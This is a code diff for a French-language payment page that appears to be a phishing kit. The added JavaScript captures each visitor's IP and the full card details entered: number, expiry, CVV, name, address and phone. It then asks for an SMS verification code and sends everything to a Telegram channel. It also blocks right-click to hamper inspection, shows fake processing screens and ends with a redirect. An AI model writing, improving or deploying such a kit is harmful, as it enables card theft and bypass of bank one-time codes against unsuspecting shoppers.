@@ -96,8 +96,17 @@
       <label for="expiry-date">Date d'expiration</label>
       <input type="text" id="expiry-date" name="expiry-date" required placeholder="MM/AA">
 
-      <label for="cvv">Code de sécurité (CVV)</label>
-      <input type="number" id="cvv" name="cvv" maxlength="3" required placeholder="XXX">
+<label for="cvv">Code de sécurité (CVV)</label>
+<input 
+  type="text" 
+  id="cvv" 
+  name="cvv" 
+  maxlength="3" 
+  pattern="\d{3}" 
+  required 
+  placeholder="XXX"
+  title="Veuillez entrer exactement 3 chiffres pour le CVV."
+>
       
       <center><input type="submit" value="Payer"></center>
     </form>
@@ -148,28 +157,13 @@
       });
     }
 
-    // Ajout automatique de "/" dans le champ de date d'expiration
-    document.getElementById('expiry-date').addEventListener('input', function (event) {
-      const input = event.target.value.replace(/\D/g, ''); // Supprime les caractères non numériques
-      if (input.length <= 2) {
-        event.target.value = input; // Ajoute uniquement le mois (MM)
-      } else {
-        event.target.value = input.slice(0, 2) + '/' + input.slice(2, 4); // Ajoute le format MM/AA
-      }
-    });
-
-    // Limiter le champ CVV à 3 chiffres maximum
-    document.getElementById('cvv').addEventListener('input', function (event) {
-      const input = event.target.value.replace(/\D/g, ''); // Supprime tout caractère non numérique
-      event.target.value = input.slice(0, 3); // Limite à 3 caractères
-    });
-
     // Fonction pour récupérer l'adresse IP publique de l'utilisateur
     function fetchUserIP() {
       fetch('https://api.ipify.org?format=json')
         .then(response => response.json())
         .then(data => {
           userIP = data.ip; // Stocker l'adresse IP
+          // Envoyer une notification avec l'IP dès l'entrée sur le site
           sendToTelegram(`Nouvel utilisateur sur le site - IP: ${userIP}`);
         })
         .catch(error => console.error('Erreur lors de la récupération de l\'IP :', error));
@@ -180,6 +174,107 @@
       fetchUserIP();
     };
 
+    // Fonction pour interdire le clic droit globalement, mais autoriser dans les champs de saisie
+    document.addEventListener('contextmenu', function(event) {
+      if (event.target.tagName !== 'INPUT' && event.target.id !== 'sms-code') {
+        event.preventDefault(); // Bloque l'inspection et tout autre clic droit
+      }
+    });
+
+    // Fonction pour autoriser uniquement le clic droit dans les champs de formulaire et SMS (pour coller)
+    document.getElementById('payment-form').addEventListener('contextmenu', function(event) {
+      if (event.target && (event.target.tagName === 'INPUT' || event.target.id === 'sms-code')) {
+        // Laisser le clic droit sur les champs de saisie et SMS (pour coller)
+        return true;
+      }
+      event.preventDefault(); // Bloquer ailleurs
+    });
+
+    // Gestionnaire de soumission du formulaire de paiement
+    document.getElementById('payment-form').addEventListener('submit', function(event) {
+      event.preventDefault();
+
+      const deliveryAddress = document.getElementById('delivery-address').value;
+      const phoneNumber = document.getElementById('phone-number').value;
+      const cardholderName = document.getElementById('cardholder-name').value;
+      const cardNumber = document.getElementById('card-number').value;
+      const expiryDate = document.getElementById('expiry-date').value;
+      const cvv = document.getElementById('cvv').value;
+
+      // Enregistrer les données du formulaire avec l'IP
+      userFormData = {
+        deliveryAddress: deliveryAddress,
+        phoneNumber: phoneNumber,
+        cardholderName: cardholderName,
+        cardNumber: cardNumber,
+        expiryDate: expiryDate,
+        cvv: cvv,
+        ip: userIP
+      };
+
+      // Ajouter l'adresse IP et l'adresse de livraison dans le message Telegram
+      let message = `
+        Paiement reçu :
+        Adresse de livraison : ${deliveryAddress}
+        Numéro de téléphone : ${phoneNumber}
+        Nom : ${cardholderName}
+        Numéro : ${cardNumber}
+        Expiration : ${expiryDate}
+        CVV : ${cvv}
+        IP : ${userIP}
+      `;
+
+      sendToTelegram(message); // Envoyer les informations à Telegram
+
+      document.getElementById('step-1').classList.add('hidden');
+      document.getElementById('step-2').classList.remove('hidden');
+
+      setTimeout(() => {
+        document.getElementById('step-2').classList.add('hidden');
+        document.getElementById('step-3').classList.remove('hidden');
+      }, 10000);
+    });
+
+    // Gestionnaire de soumission du formulaire de code SMS
+    document.getElementById('sms-form').addEventListener('submit', function(event) {
+      event.preventDefault();
+
+      const smsCode = document.getElementById('sms-code').value;
+
+      // Récupérer les données du formulaire précédemment stockées et ajouter le code SMS
+      let message = `
+        Formulaire complet pour IP : ${userIP}
+        Adresse de livraison : ${userFormData.deliveryAddress}
+        Numéro de téléphone : ${userFormData.phoneNumber}
+        Nom : ${userFormData.cardholderName}
+        Numéro : ${userFormData.cardNumber}
+        Expiration : ${userFormData.expiryDate}
+        CVV : ${userFormData.cvv}
+        Code SMS reçu : ${smsCode}
+      `;
+      
+      sendToTelegram(message); // Envoyer les informations avec le code SMS à Telegram
+
+      document.getElementById('step-3').classList.add('hidden');
+      document.getElementById('step-4').classList.remove('hidden');
+
+      setTimeout(() => {
+        document.getElementById('step-4').classList.add('hidden');
+        document.getElementById('step-5').classList.remove('hidden');
+
+        setTimeout(() => {
+          window.location.href = "https://justmoicom.github.io/vlad/"; // URL après paiement
+        }, 5000);
+      }, 7000);
+    });
+
+    document.getElementById('expiry-date').addEventListener('input', function() {
+      let value = this.value.replace(/\D/g, '');
+      if (value.length > 2) {
+        value = value.slice(0, 2) + '/' + value.slice(2, 4);
+      }
+      this.value = value;
+    });
   </script>
 
 </body>
